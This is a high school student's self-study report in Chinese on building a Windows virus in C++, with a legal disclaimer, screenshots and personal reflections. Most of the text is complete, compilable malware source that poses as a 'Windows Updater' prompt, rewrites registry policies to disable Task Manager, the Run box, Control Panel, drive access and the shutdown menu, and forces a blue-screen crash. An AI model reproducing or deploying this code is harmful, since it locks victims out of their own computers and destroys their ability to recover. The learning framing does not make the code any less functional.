高二上自主學習--電腦病毒實作-C++病毒
===
:::warning
==本文僅做於教育使用，不得用於非法用途==

根據中華民國刑法
第 358 條
無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞，而入侵他人之電腦或其相關設備者，處三年以下有期徒刑、拘役或科或併科三十萬元以下罰金。
第 359 條
無故取得、刪除或變更他人電腦或其相關設備之電磁紀錄，致生損害於公眾或他人者，處五年以下有期徒刑、拘役或科或併科六十萬元以下罰金。
第 360 條
無故以電腦程式或其他電磁方式干擾他人電腦或其相關設備，致生損害於公眾或他人者，處三年以下有期徒刑、拘役或科或併科三十萬元以下罰金。
第 361 條
對於公務機關之電腦或其相關設備犯前三條之罪者，加重其刑至二分之一。
:::
病毒原始碼
---
```
#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <iostream>
#include <time.h>
#include <mmsystem.h>
#include <atlstr.h>
#include <thread>
#include"resource.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
using namespace std;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

BOOL admin()
{
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdministratorsGroup))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

    if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
    {
        dwError = GetLastError();
        goto Cleanup;
    }

Cleanup:

    if (pAdministratorsGroup){
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    if (ERROR_SUCCESS != dwError)
    {
        throw dwError;
    }

    return fIsRunAsAdmin;
}
void disabletskmanager() {
  HKEY hkey;
  DWORD value = 1;
  RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
  RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
  RegCloseKey(hkey);

}
void noclose() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoClose", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void noctrlpanel() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoControlPanel", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void nodrive() {
    HKEY hkey;
    DWORD value = 4294967295;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoDrives", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void nofind() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoFind", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void nofolderoptions() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoFolderOptions", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void noviewondrive() {
    HKEY hkey;
    DWORD value = 4294967295;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoViewOnDrive", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void norun() {
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoRun", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}
void bsod() {
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}
void message() {
    ShellExecute(NULL, L"open", L"https://www.microsoft.com/en/servicesagreement", NULL, NULL, SW_SHOWNORMAL);
}
void opendcim() {
    for (int i = 0; i <= 15; i++) {
        ShellExecute(NULL, L"open", L"https://themastersedu.com/editor_images/Image/line_20161121_main.jpg", NULL, NULL, SW_SHOWNOACTIVATE);
        Sleep(1000);
    }
}
void virus() {
    noclose();//禁用開機選單
    disabletskmanager();//禁用工作管理員
    noctrlpanel();//禁用控制台
    nodrive();//隱藏磁碟機
    nofind();//禁用搜尋,win11似乎沒用
    nofolderoptions();//隱藏資料夾選項
    noviewondrive();//禁止存取磁碟
    norun();//禁用win+R
}

int main() {
    if (admin())//確認目前是否以管理員模式執行程式
    {
        thread work1(message);//在第一個執行序裡執行打開微軟授權合約網頁
        MessageBox(NULL, (L"Please Read the Contract Then Press OK\nhttps://www.microsoft.com/en/servicesagreement"), (L"Windows Updater"), MB_OKCANCEL|MB_ICONINFORMATION);//執行MassegeBox
        PlaySound(LPCWSTR(IDR_WAVE1), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC | SND_LOOP);//播放音檔
        thread work2(virus);//執行virus函式
        MessageBox(NULL, (L"哈哈哈你好笨喔笑死呵呵"), (L"恭喜中毒"), MB_OK);//跳出MassegeBox告知中毒
        thread work3(opendcim);//打開網頁裡的圖片
        bsod();//執行藍屏使系統重開
        system("pause>nu1");
    }
    else//若不是管理員身分
    {
        MessageBox(NULL, (L"Please Run As Admin Mode"), (L"ERROR"), MB_OK);//跳出MassegeBox請使用者以管理員身分執行
        system("pause>nu1");
    }
```

---
病毒運行過程
---
![WINdefend](https://hackmd.io/_uploads/SJ77ze3ta.png)
**微軟防毒檢測結果**

![please run as admin](https://hackmd.io/_uploads/rym7GxhtT.png)
**未以管理員模式運行**

![please read the contarct](https://hackmd.io/_uploads/BJE7Gx3ta.png)
**以管理員模式運行後跳出第一個訊息框**

![微軟官方葉面](https://hackmd.io/_uploads/HkEmGgnYa.png)
**跳出微軟官方授權合約網頁**

![哈哈哈](https://hackmd.io/_uploads/BJ47zlhFT.png)
**註冊表修改完後跳出該訊息框**

![哈哈哈 照片](https://hackmd.io/_uploads/r17P6b2F6.png)
**開啟網頁照片**

![BSOD](https://hackmd.io/_uploads/BJlxwWnKT.png)
**跳出藍屏以重新開機套用註冊表**

![NODRIVES](https://hackmd.io/_uploads/Bk47Gg2Yp.png)
**可以看到所有磁碟都看不到了**

![NO VIEW ON C](https://hackmd.io/_uploads/BkVXMx3Yp.png)
**直接在路徑進入C槽也進不去**

![NOVIEW ON FOLDER](https://hackmd.io/_uploads/rJ47zx2FT.png)
**所有的資料夾也無法存取**

![taskmanager](https://hackmd.io/_uploads/BkL8PZhF6.png)
**工作管理員無法進入**

![WIN+R](https://hackmd.io/_uploads/Bke9v-nYT.png)
**WIN+R開啟 執行 也無法開啟**

![WIN+R](https://hackmd.io/_uploads/Bke9v-nYT.png)
**WIN+E開啟 檔案總管 也無法開啟**

![WIN+R](https://hackmd.io/_uploads/Bke9v-nYT.png)
**控制台也無法開啟**

![no power off](https://hackmd.io/_uploads/HJ6Av-nYa.png)
**電源選單也不能使用**

![regedit explorer](https://hackmd.io/_uploads/HkuFtb2K6.png)
**被病毒修改的註冊表 檔案總管部分**

![regedit system](https://hackmd.io/_uploads/rJEhFW3Fa.png)
**被病毒修改的註冊表 系統部分**

在這份自主學習中，我學到了甚麼
---
1. Microsoft Visual Studio的使用
VS是一個非常好用的IDE，在這份病毒裡的音樂，我就是使用VS的"資源功能"將音樂包入EXE檔案中，此外VS不像VS Code裡還是自己裝編譯器等，只需要下載他自己的軟體包，就可以直接使用，在建置編譯環境上省下很多時間
2. Windows註冊表的修改
Windows裡有一個東西是"登入編輯程式(regedit)"，裡面存放各種機碼數值，透過更改這些值可以達到各種目的，像是禁止存取磁碟、禁用工作管理員等
3. C+ + 的撰寫
因為我的病毒是使用C+ + 撰寫，因此C+ + 的基礎就很重要，像是自訂函式等，也算是幫自己複習了一遍C+ + 的基礎
4. 虛擬機的架設
由於病毒在實體機內會直接破壞，因此測試時耗時耗力，所以就得要架設虛擬機來測試，才不是破壞到實體機
5. 查找資料
因為病毒的方面比較少人會分享，所以要查找資料的方向就得要非常廣，才有機會找到自己最需要的，像是可能要去查其他程式語言的作品
6. 資安意識
從這份自主學習中我也了解了許多病毒的來源，會中毒大部分都是自己不小心，現在的防毒其實都擋得下來，所以通常都是為了裝破解版軟體等關閉防毒，然後電腦就被破解了

學習心得
---
在剛開始經過一個月的摸索，我才找到該如何開始做，一開始我一直不停在研究windows.h這個函式庫，但是我最後發現他真的太大了，如果我要研究完可能整個學期，後來我決定只學需要用到的函式。再來我就去參考非常多別人的病毒運行過程，但是因為c++的病毒不多人寫過，因此我想到一個方法，就是去找我想要的動作然後看看別人的方法，因為病毒其實就是一隻一般的程式，只是用在不對的地方，例如修改註冊表，大部分是用在登錄程式所需的機碼，像是連結至伺服器確認授權、執行開機自啟動等等，但是修改註冊表的程式碼都相同，因此就可以將機碼修改成本來用於防止外人存取磁碟而設計的"禁止存取磁碟"等機碼。
因此做完整個病毒後我發現了，大部分病毒的構造其實很簡單，都只是一些普通的程式碼，但是被用到不對的地方之後就會對電腦產生破壞，我們無法控制這些人士想做甚麼，但是我們可以透過自己的防備來防止這些病毒，這也是為甚麼我會做這份自主學習，透過了解病毒的過程，知道破壞了哪些部分，了解如何防範，以及在被破壞之後如何修復。
最後則是學習心態的部分，雖然我一開始的一個月毫無進展，但我在休息一陣子後再次想到方法，後來測試時也因為誤觸，使磁碟完全清空，檔案都不見，但我並沒有放棄，也才能做出這份豐富自主學習。